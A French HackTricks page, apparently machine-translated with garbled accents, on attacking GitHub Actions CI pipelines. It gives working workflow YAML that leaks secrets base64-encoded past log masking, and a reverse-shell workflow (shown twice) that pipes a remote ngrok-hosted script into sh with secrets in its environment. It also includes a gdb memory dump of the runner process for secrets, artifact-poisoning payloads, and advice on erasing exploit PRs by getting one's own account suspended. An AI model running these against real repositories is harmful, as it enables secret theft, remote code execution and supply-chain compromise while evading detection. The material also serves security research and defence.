# Abusing Github Actions

{% hint style="success" %}
Apprenez et pratiquez le AWS Hacking :<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Apprenez et pratiquez le GCP Hacking : <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Soutenez HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop) !
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez des astuces de hacking en soumettant des PRs aux d√©p√¥ts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}

## Informations de base

Sur cette page, vous trouverez :

* Un **r√©sum√© de tous les impacts** d'un attaquant parvenant √† acc√©der √† une Github Action
* Diff√©rentes fa√ßons d'**acc√©der √† une action** :
* Avoir des **permissions** pour cr√©er l'action
* Abuser des d√©clencheurs li√©s aux **pull request**
* Abuser d'**autres techniques d'acc√®s externes**
* **Pivoter** √† partir d'un d√©p√¥t d√©j√† compromis
* Enfin, une section sur les **techniques post-exploitation pour abuser d'une action de l'int√©rieur** (causant les impacts mentionn√©s)

## R√©sum√© des impacts

Pour une introduction sur [**Github Actions, consultez les informations de base**](../basic-github-information.md#github-actions).

Dans le cas o√π vous pouvez **ex√©cuter des actions Github arbitraires/injecter du code** dans un **d√©p√¥t**, vous pourriez √™tre capable de :

* **Voler** les **secrets** de ce d√©p√¥t/organisation.
* Si vous ne pouvez qu'injecter, vous pouvez voler tout ce qui est d√©j√† pr√©sent dans le workflow.
* Abuser des **privil√®ges du d√©p√¥t** pour acc√©der √† d'autres plateformes telles que AWS et GCP.
* **Ex√©cuter du code dans des workers personnalis√©s** (si des workers personnalis√©s sont utilis√©s) et essayer de pivoter √† partir de l√†.
* **√âcraser** le **code** du d√©p√¥t.
* Cela d√©pend des privil√®ges du `GITHUB_TOKEN` (le cas √©ch√©ant).
* **Compromettre** les **d√©ploiements** et autres **artifacts**.
* Si le code d√©ploie ou stocke quelque chose, vous pourriez le modifier et obtenir un acc√®s suppl√©mentaire.

## GITHUB\_TOKEN

Ce "**secret**" (provenant de `${{ secrets.GITHUB_TOKEN }}` et `${{ github.token }}`) est donn√© lorsque l'administrateur active cette option :

<figure><img src="../../../.gitbook/assets/image (86).png" alt=""><figcaption></figcaption></figure>

Ce token est le m√™me qu'une **application Github utilisera**, donc il peut acc√©der aux m√™mes endpoints : [https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps](https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps)

{% hint style="warning" %}
Github devrait publier un [**flux**](https://github.com/github/roadmap/issues/74) qui **permet l'acc√®s inter-d√©p√¥ts** au sein de GitHub, afin qu'un d√©p√¥t puisse acc√©der √† d'autres d√©p√¥ts internes en utilisant le `GITHUB_TOKEN`.
{% endhint %}

Vous pouvez voir les **permissions** possibles de ce token ici : [https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github\_token](https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github\_token)

Notez que le token **expire apr√®s la fin du job**.\
Ces tokens ressemblent √† ceci : `ghs_veaxARUji7EXszBMbhkr4Nz2dYz0sqkeiur7`

Quelques choses int√©ressantes que vous pouvez faire avec ce token :

{% tabs %}
{% tab title="Merge PR" %}
```bash
# Merge PR
curl -X PUT \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/merge \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
-d '{"commit_title":"commit_title"}'
```
{% endtab %}

{% tab title="Approve PR" %}
```bash
# Approve a PR
curl -X POST \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/reviews \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
-d '{"event":"APPROVE"}'
```
{% tab title="Cr√©er PR" %}
```bash
# Create a PR
curl -X POST \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
https://api.github.com/repos/<org_name>/<repo_name>/pulls \
-d '{"head":"<branch_name>","base":"master", "title":"title"}'
```
{% endtab %}
{% endtabs %}

{% hint style="danger" %}
Notez que dans plusieurs occasions, vous pourrez trouver **des tokens d'utilisateur github √† l'int√©rieur des environnements Github Actions ou dans les secrets**. Ces tokens peuvent vous donner plus de privil√®ges sur le d√©p√¥t et l'organisation.
{% endhint %}

<details>

<summary>Lister les secrets dans la sortie de Github Action</summary>
```yaml
name: list_env
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
List_env:
runs-on: ubuntu-latest
steps:
- name: List Env
# Need to base64 encode or github will change the secret value for "***"
run: sh -c 'env | grep "secret_" | base64 -w0'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

<details>

<summary>Obtenir un reverse shell avec des secrets</summary>
```yaml
name: revshell
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
create_pull_request:
runs-on: ubuntu-latest
steps:
- name: Get Rev Shell
run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

Il est possible de v√©rifier les permissions donn√©es √† un Github Token dans les d√©p√¥ts d'autres utilisateurs **en v√©rifiant les logs** des actions :

<figure><img src="../../../.gitbook/assets/image (286).png" alt="" width="269"><figcaption></figcaption></figure>

## Ex√©cution Autoris√©e

{% hint style="info" %}
Ce serait le moyen le plus simple de compromettre les actions Github, car ce cas suppose que vous avez acc√®s √† **cr√©er un nouveau d√©p√¥t dans l'organisation**, ou avez **des privil√®ges d'√©criture sur un d√©p√¥t**.

Si vous √™tes dans ce sc√©nario, vous pouvez simplement consulter les [techniques de post-exploitation](./#post-exploitation-techniques-from-inside-an-action).
{% endhint %}

### Ex√©cution √† partir de la Cr√©ation d'un D√©p√¥t

Dans le cas o√π les membres d'une organisation peuvent **cr√©er de nouveaux d√©p√¥ts** et que vous pouvez ex√©cuter des actions github, vous pouvez **cr√©er un nouveau d√©p√¥t et voler les secrets d√©finis au niveau de l'organisation**.

### Ex√©cution √† partir d'une Nouvelle Branche

Si vous pouvez **cr√©er une nouvelle branche dans un d√©p√¥t qui contient d√©j√† une Github Action** configur√©e, vous pouvez **la modifier**, **t√©l√©verser** le contenu, puis **ex√©cuter cette action √† partir de la nouvelle branche**. De cette fa√ßon, vous pouvez **exfiltrer les secrets au niveau du d√©p√¥t et de l'organisation** (mais vous devez savoir comment ils sont appel√©s).

Vous pouvez rendre l'action modifi√©e ex√©cutable **manuellement**, lorsqu'une **PR est cr√©√©e** ou lorsque **du code est pouss√©** (en fonction de la discr√©tion souhait√©e) :
```yaml
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- master
push: # Run it when a push is made to a branch
branches:
- current_branch_name

# Use '**' instead of a branh name to trigger the action in all the cranches
```
***

## Ex√©cution Fork√©e

{% hint style="info" %}
Il existe diff√©rents d√©clencheurs qui pourraient permettre √† un attaquant d'**ex√©cuter une Github Action d'un autre d√©p√¥t**. Si ces actions d√©clenchables sont mal configur√©es, un attaquant pourrait √™tre en mesure de les compromettre.
{% endhint %}

### `pull_request`

Le d√©clencheur de workflow **`pull_request`** ex√©cutera le workflow chaque fois qu'une pull request est re√ßue avec quelques exceptions : par d√©faut, si c'est la **premi√®re fois** que vous **collaborez**, un **mainteneur** devra **approuver** l'**ex√©cution** du workflow :

<figure><img src="../../../.gitbook/assets/image (184).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
Comme la **limitation par d√©faut** concerne les contributeurs de **premi√®re fois**, vous pourriez contribuer en **corrigeant un bug/typo valide** puis envoyer **d'autres PRs pour abuser de vos nouveaux privil√®ges `pull_request`**.

**J'ai test√© cela et √ßa ne fonctionne pas** : ~~Une autre option serait de cr√©er un compte avec le nom de quelqu'un qui a contribu√© au projet et supprim√© son compte.~~
{% endhint %}

De plus, par d√©faut, **emp√™che les permissions d'√©criture** et **l'acc√®s aux secrets** du d√©p√¥t cible comme mentionn√© dans les [**docs**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflows-in-forked-repositories) :

> √Ä l'exception de `GITHUB_TOKEN`, **les secrets ne sont pas transmis au runner** lorsqu'un workflow est d√©clench√© √† partir d'un d√©p√¥t **fork√©**. Le **`GITHUB_TOKEN` a des permissions en lecture seule** dans les pull requests **provenant de d√©p√¥ts fork√©s**.

Un attaquant pourrait modifier la d√©finition de la Github Action afin d'ex√©cuter des choses arbitraires et d'ajouter des actions arbitraires. Cependant, il ne pourra pas voler des secrets ou √©craser le d√©p√¥t en raison des limitations mentionn√©es.

{% hint style="danger" %}
**Oui, si l'attaquant change dans la PR la github action qui sera d√©clench√©e, sa Github Action sera celle utilis√©e et non celle du d√©p√¥t d'origine !**
{% endhint %}

Comme l'attaquant contr√¥le √©galement le code ex√©cut√©, m√™me s'il n'y a pas de secrets ou de permissions d'√©criture sur le `GITHUB_TOKEN`, un attaquant pourrait par exemple **t√©l√©charger des artefacts malveillants**.

### **`pull_request_target`**

Le d√©clencheur de workflow **`pull_request_target`** a des **permissions d'√©criture** sur le d√©p√¥t cible et **acc√®s aux secrets** (et ne demande pas de permission).

Notez que le d√©clencheur de workflow **`pull_request_target`** **s'ex√©cute dans le contexte de base** et non dans celui donn√© par la PR (pour **ne pas ex√©cuter de code non fiable**). Pour plus d'informations sur `pull_request_target`, [**consultez les docs**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#pull\_request\_target).\
De plus, pour plus d'informations sur cette utilisation sp√©cifique dangereuse, consultez ce [**post de blog github**](https://securitylab.github.com/research/github-actions-preventing-pwn-requests/).

Il pourrait sembler que parce que le **workflow ex√©cut√©** est celui d√©fini dans la **base** et **non dans la PR**, il est **s√©curis√©** d'utiliser **`pull_request_target`**, mais il y a **quelques cas o√π ce n'est pas le cas**.

Et celui-ci aura **acc√®s aux secrets**.

### `workflow_run`

Le d√©clencheur [**workflow\_run**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflow\_run) permet d'ex√©cuter un workflow √† partir d'un autre lorsqu'il est `completed`, `requested` ou `in_progress`.

Dans cet exemple, un workflow est configur√© pour s'ex√©cuter apr√®s que le workflow s√©par√© "Run Tests" soit termin√© :
```yaml
on:
workflow_run:
workflows: [Run Tests]
types:
- completed
```
De plus, selon la documentation : Le workflow d√©marr√© par l'√©v√©nement `workflow_run` est capable d'**acc√©der aux secrets et d'√©crire des tokens, m√™me si le workflow pr√©c√©dent ne l'√©tait pas**.

Ce type de workflow pourrait √™tre attaqu√© s'il **d√©pend** d'un **workflow** qui peut √™tre **d√©clench√©** par un utilisateur externe via **`pull_request`** ou **`pull_request_target`**. Quelques exemples vuln√©rables peuvent √™tre [**trouv√©s dans ce blog**](https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability)**.** Le premier consiste en un workflow d√©clench√© par **`workflow_run`** t√©l√©chargeant le code de l'attaquant : `${{ github.event.pull_request.head.sha }}`\
Le second consiste √† **passer** un **artifact** du code **non fiable** au workflow **`workflow_run`** et √† utiliser le contenu de cet artifact d'une mani√®re qui le rend **vuln√©rable √† RCE**.

### `workflow_call`

TODO

TODO : V√©rifier si, lorsqu'il est ex√©cut√© √† partir d'un pull\_request, le code utilis√©/t√©l√©charg√© provient de l'origine ou du PR fork√©

## Abuser de l'ex√©cution fork√©e

Nous avons mentionn√© toutes les fa√ßons dont un attaquant externe pourrait r√©ussir √† faire ex√©cuter un workflow github, maintenant examinons comment ces ex√©cutions, si mal configur√©es, pourraient √™tre abus√©es :

### Ex√©cution de checkout non fiable

Dans le cas de **`pull_request`**, le workflow va √™tre ex√©cut√© dans le **contexte du PR** (donc il ex√©cutera le **code malveillant du PR**), mais quelqu'un doit d'abord **l'autoriser** et il s'ex√©cutera avec certaines [limitations](./#pull\_request).

Dans le cas d'un workflow utilisant **`pull_request_target` ou `workflow_run`** qui d√©pend d'un workflow pouvant √™tre d√©clench√© √† partir de **`pull_request_target` ou `pull_request`**, le code du d√©p√¥t original sera ex√©cut√©, donc l'**attaquant ne peut pas contr√¥ler le code ex√©cut√©**.

{% hint style="danger" %}
Cependant, si l'**action** a un **checkout PR explicite** qui **obtiendra le code du PR** (et non de la base), elle utilisera le code contr√¥l√© par l'attaquant. Par exemple (voir la ligne 12 o√π le code du PR est t√©l√©charg√©) :
{% endhint %}

<pre class="language-yaml"><code class="lang-yaml"># INSECURE. Provided as an example only.
on:
pull_request_target

jobs:
build:
name: Build and test
runs-on: ubuntu-latest
steps:
<strong>    - uses: actions/checkout@v2
</strong><strong>      with:
</strong><strong>        ref: ${{ github.event.pull_request.head.sha }}
</strong>
- uses: actions/setup-node@v1
- run: |
npm install
npm build

- uses: completely/fakeaction@v2
with:
arg1: ${{ secrets.supersecret }}

- uses: fakerepo/comment-on-pr@v1
with:
message: |
Thank you!
</code></pre>

Le code potentiellement **non fiable est ex√©cut√© pendant `npm install` ou `npm build`** car les scripts de build et les **packages r√©f√©renc√©s sont contr√¥l√©s par l'auteur du PR**.

{% hint style="warning" %}
Un github dork pour rechercher des actions vuln√©rables est : `event.pull_request pull_request_target extension:yml` cependant, il existe diff√©rentes fa√ßons de configurer les jobs pour qu'ils soient ex√©cut√©s en toute s√©curit√© m√™me si l'action est configur√©e de mani√®re non s√©curis√©e (comme utiliser des conditionnels sur qui est l'acteur g√©n√©rant le PR).
{% endhint %}

### Injections de script de contexte <a href="#understanding-the-risk-of-script-injections" id="understanding-the-risk-of-script-injections"></a>

Notez qu'il existe certains [**contextes github**](https://docs.github.com/en/actions/reference/context-and-expression-syntax-for-github-actions#github-context) dont les valeurs sont **contr√¥l√©es** par l'**utilisateur** cr√©ant le PR. Si l'action github utilise ces **donn√©es pour ex√©cuter quoi que ce soit**, cela pourrait conduire √† une **ex√©cution de code arbitraire :**

{% content-ref url="gh-actions-context-script-injections.md" %}
[gh-actions-context-script-injections.md](gh-actions-context-script-injections.md)
{% endcontent-ref %}

### **Injection de script GITHUB\_ENV** <a href="#what-is-usdgithub_env" id="what-is-usdgithub_env"></a>

D'apr√®s la documentation : Vous pouvez rendre une **variable d'environnement disponible pour toutes les √©tapes suivantes** dans un job de workflow en d√©finissant ou en mettant √† jour la variable d'environnement et en l'√©crivant dans le fichier d'environnement **`GITHUB_ENV`**.

Si un attaquant pouvait **injecter une valeur quelconque** dans cette **variable env**, il pourrait injecter des variables env qui pourraient ex√©cuter du code dans les √©tapes suivantes telles que **LD\_PRELOAD** ou **NODE\_OPTIONS**.

Par exemple ([**ceci**](https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability-0) et [**ceci**](https://www.legitsecurity.com/blog/-how-we-found-another-github-action-environment-injection-vulnerability-in-a-google-project)), imaginez un workflow qui fait confiance √† un artifact t√©l√©charg√© pour stocker son contenu dans la variable env **`GITHUB_ENV`**. Un attaquant pourrait t√©l√©charger quelque chose comme ceci pour le compromettre :

<figure><img src="../../../.gitbook/assets/image (261).png" alt=""><figcaption></figcaption></figure>

### Actions Github tierces vuln√©rables

#### [dawidd6/action-download-artifact](https://github.com/dawidd6/action-download-artifact)

Comme mentionn√© dans [**ce post de blog**](https://www.legitsecurity.com/blog/github-actions-that-open-the-door-to-cicd-pipeline-attacks), cette action Github permet d'acc√©der aux artifacts de diff√©rents workflows et m√™me de d√©p√¥ts.

Le probl√®me est que si le param√®tre **`path`** n'est pas d√©fini, l'artifact est extrait dans le r√©pertoire actuel et il peut remplacer des fichiers qui pourraient √™tre utilis√©s ou m√™me ex√©cut√©s plus tard dans le workflow. Par cons√©quent, si l'Artifact est vuln√©rable, un attaquant pourrait en abuser pour compromettre d'autres workflows faisant confiance √† l'Artifact.

Exemple de workflow vuln√©rable :
```yaml
on:
workflow_run:
workflows: ["some workflow"]
types:
- completed

jobs:
success:
runs-on: ubuntu-latest
steps:
- uses: actions/checkout@v2
- name: download artifact
uses: dawidd6/action-download-artifact
with:
workflow: ${{ github.event.workflow_run.workflow_id }}
name: artifact
- run: python ./script.py
with:
name: artifact
path: ./script.py
```
Cela pourrait √™tre attaqu√© avec ce workflow :
```yaml
name: "some workflow"
on: pull_request

jobs:
upload:
runs-on: ubuntu-latest
steps:
- run: echo "print('exploited')" > ./script.py
- uses actions/upload-artifact@v2
with:
name: artifact
path: ./script.py
```
***

## Autre Acc√®s Externe

### D√©tournement de R√©pertoire de Namespace Supprim√©

Si un compte change de nom, un autre utilisateur pourrait enregistrer un compte avec ce nom apr√®s un certain temps. Si un d√©p√¥t avait **moins de 100 √©toiles avant le changement de nom**, Github permettra au nouvel utilisateur enregistr√© avec le m√™me nom de cr√©er un **d√©p√¥t avec le m√™me nom** que celui supprim√©.

{% hint style="danger" %}
Donc, si une action utilise un d√©p√¥t d'un compte inexistant, il est toujours possible qu'un attaquant puisse cr√©er ce compte et compromettre l'action.
{% endhint %}

Si d'autres d√©p√¥ts utilisaient **des d√©pendances de ce d√©p√¥t utilisateur**, un attaquant pourra les d√©tourner. Voici une explication plus compl√®te : [https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/](https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/)

***

## Pivotement de D√©p√¥t

{% hint style="info" %}
Dans cette section, nous parlerons des techniques qui permettraient de **pivoter d'un d√©p√¥t √† un autre** en supposant que nous ayons un certain type d'acc√®s au premier (voir la section pr√©c√©dente).
{% endhint %}

### Empoisonnement du Cache

Un cache est maintenu entre **les ex√©cutions de workflow dans la m√™me branche**. Ce qui signifie que si un attaquant **compromet** un **package** qui est ensuite stock√© dans le cache et **t√©l√©charg√©** et ex√©cut√© par un workflow **plus privil√©gi√©**, il pourra √©galement **compromettre** ce workflow.

{% content-ref url="gh-actions-cache-poisoning.md" %}
[gh-actions-cache-poisoning.md](gh-actions-cache-poisoning.md)
{% endcontent-ref %}

### Empoisonnement d'Artifact

Les workflows peuvent utiliser **des artifacts d'autres workflows et m√™me de d√©p√¥ts**, si un attaquant parvient √† **compromettre** l'Action Github qui **t√©l√©charge un artifact** qui est ensuite utilis√© par un autre workflow, il pourrait **compromettre les autres workflows** :

{% content-ref url="gh-actions-artifact-poisoning.md" %}
[gh-actions-artifact-poisoning.md](gh-actions-artifact-poisoning.md)
{% endcontent-ref %}

***

## Post Exploitation √† partir d'une Action

### Acc√®s √† AWS et GCP via OIDC

Consultez les pages suivantes :

{% content-ref url="../../../pentesting-cloud/aws-security/aws-basic-information/aws-federation-abuse.md" %}
[aws-federation-abuse.md](../../../pentesting-cloud/aws-security/aws-basic-information/aws-federation-abuse.md)
{% endcontent-ref %}

{% content-ref url="../../../pentesting-cloud/gcp-security/gcp-basic-information/gcp-federation-abuse.md" %}
[gcp-federation-abuse.md](../../../pentesting-cloud/gcp-security/gcp-basic-information/gcp-federation-abuse.md)
{% endcontent-ref %}

### Acc√®s aux secrets <a href="#accessing-secrets" id="accessing-secrets"></a>

Si vous injectez du contenu dans un script, il est int√©ressant de savoir comment vous pouvez acc√©der aux secrets :

* Si le secret ou le token est d√©fini comme une **variable d'environnement**, il peut √™tre directement accessible via l'environnement en utilisant **`printenv`**.

<details>

<summary>Lister les secrets dans la sortie de l'Action Github</summary>
```yaml
name: list_env
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
List_env:
runs-on: ubuntu-latest
steps:
- name: List Env
# Need to base64 encode or github will change the secret value for "***"
run: sh -c 'env | grep "secret_" | base64 -w0'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}

secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

<details>

<summary>Obtenir un shell invers√© avec des secrets</summary>
```yaml
name: revshell
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
create_pull_request:
runs-on: ubuntu-latest
steps:
- name: Get Rev Shell
run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

* Si le secret est utilis√© **directement dans une expression**, le script shell g√©n√©r√© est stock√© **sur le disque** et est accessible.
* ```bash
cat /home/runner/work/_temp/*
```
* Pour une action JavaScript, les secrets sont envoy√©s via des variables d'environnement
* ```bash
ps axe | grep node
```
* Pour une **custom action**, le risque peut varier en fonction de la mani√®re dont un programme utilise le secret obtenu √† partir de l'**argument** :

```yaml
uses: fakeaction/publish@v3
with:
key: ${{ secrets.PUBLISH_KEY }}
```

### Abuser des Self-hosted runners

La fa√ßon de trouver quelles **Github Actions sont ex√©cut√©es dans une infrastructure non-github** est de rechercher **`runs-on: self-hosted`** dans le fichier de configuration yaml de Github Action.

Les runners **self-hosted** peuvent avoir acc√®s √† des **informations extr√™mement sensibles**, √† d'autres **syst√®mes r√©seau** (points de terminaison vuln√©rables dans le r√©seau ? service de m√©tadonn√©es ?) ou, m√™me s'ils sont isol√©s et d√©truits, **plus d'une action peut √™tre ex√©cut√©e en m√™me temps** et l'action malveillante pourrait **voler les secrets** de l'autre.

Dans les runners self-hosted, il est √©galement possible d'obtenir les **secrets du processus \_Runner.Listener**\*\* qui contiendra tous les secrets des workflows √† n'importe quelle √©tape en vidant sa m√©moire :

{% code overflow="wrap" %}
```bash
sudo apt-get install -y gdb
sudo gcore -o k.dump "$(ps ax | grep 'Runner.Listener' | head -n 1 | awk '{ print $1 }')"
```
{% endcode %}

Consultez [**cet article pour plus d'informations**](https://karimrahal.com/2023/01/05/github-actions-leaking-secrets/).

### Registre d'Images Docker Github

Il est possible de cr√©er des actions Github qui **construiront et stockeront une image Docker √† l'int√©rieur de Github**.\
Un exemple peut √™tre trouv√© dans l'extension suivante :

<details>

<summary>Github Action Build &#x26; Push Docker Image</summary>
```yaml
[...]

- name: Set up Docker Buildx
uses: docker/setup-buildx-action@v1

- name: Login to GitHub Container Registry
uses: docker/login-action@v1
with:
registry: ghcr.io
username: ${{ github.repository_owner }}
password: ${{ secrets.ACTIONS_TOKEN }}

- name: Add Github Token to Dockerfile to be able to download code
run: |
sed -i -e 's/TOKEN=##VALUE##/TOKEN=${{ secrets.ACTIONS_TOKEN }}/g' Dockerfile

- name: Build and push
uses: docker/build-push-action@v2
with:
context: .
push: true
tags: |
ghcr.io/${{ github.repository_owner }}/${{ github.event.repository.name }}:latest
ghcr.io/${{ github.repository_owner }}/${{ github.event.repository.name }}:${{ env.GITHUB_NEWXREF }}-${{ github.sha }}

[...]
```
</details>

Comme vous avez pu le voir dans le code pr√©c√©dent, le registre Github est h√©berg√© dans **`ghcr.io`**.

Un utilisateur avec des permissions de lecture sur le d√©p√¥t pourra alors t√©l√©charger l'image Docker en utilisant un jeton d'acc√®s personnel :
```bash
echo $gh_token | docker login ghcr.io -u <username> --password-stdin
docker pull ghcr.io/<org-name>/<repo_name>:<tag>
```
Puis, l'utilisateur pourrait rechercher des **secrets leak√©s dans les couches de l'image Docker :**

{% embed url="https://book.hacktricks.xyz/generic-methodologies-and-resources/basic-forensic-methodology/docker-forensics" %}

### Informations sensibles dans les logs de Github Actions

M√™me si **Github** essaie de **d√©tecter les valeurs secr√®tes** dans les logs des actions et de **les masquer**, **d'autres donn√©es sensibles** qui pourraient avoir √©t√© g√©n√©r√©es lors de l'ex√©cution de l'action ne seront pas cach√©es. Par exemple, un JWT sign√© avec une valeur secr√®te ne sera pas cach√© √† moins qu'il ne soit [sp√©cifiquement configur√©](https://github.com/actions/toolkit/tree/main/packages/core#setting-a-secret).

## Cacher ses traces

(Technique tir√©e de [**ici**](https://divyanshu-mehta.gitbook.io/researchs/hijacking-cloud-ci-cd-systems-for-fun-and-profit)) Tout d'abord, toute PR soumise est clairement visible au public sur Github et au compte GitHub cible. Par d√©faut sur GitHub, nous **ne pouvons pas supprimer une PR d'internet**, mais il y a une astuce. Pour les comptes Github qui sont **suspendus** par Github, toutes leurs **PRs sont automatiquement supprim√©es** et retir√©es d'internet. Donc, pour cacher votre activit√©, vous devez soit faire **suspendre votre compte GitHub soit faire signaler votre compte**. Cela **cacherait toutes vos activit√©s** sur GitHub d'internet (en gros, supprimer toutes vos PR d'exploitation).

Une organisation sur GitHub est tr√®s proactive pour signaler des comptes √† GitHub. Tout ce que vous avez √† faire est de partager "quelques trucs" dans Issue et ils s'assureront que votre compte soit suspendu en 12 heures :p et voil√†, votre exploitation est devenue invisible sur github.

{% hint style="warning" %}
La seule fa√ßon pour une organisation de d√©couvrir qu'elle a √©t√© cibl√©e est de v√©rifier les logs GitHub depuis SIEM car depuis l'interface GitHub, la PR serait supprim√©e.
{% endhint %}

## Outils

Les outils suivants sont utiles pour trouver des workflows Github Action et m√™me trouver ceux vuln√©rables :

* [https://github.com/CycodeLabs/raven](https://github.com/CycodeLabs/raven)
* [https://github.com/carlospolop/PurplePanda](https://github.com/carlospolop/PurplePanda)

{% hint style="success" %}
Apprenez et pratiquez le Hacking AWS :<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Apprenez et pratiquez le Hacking GCP : <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Soutenez HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop) !
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez des astuces de hacking en soumettant des PRs aux d√©p√¥ts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}
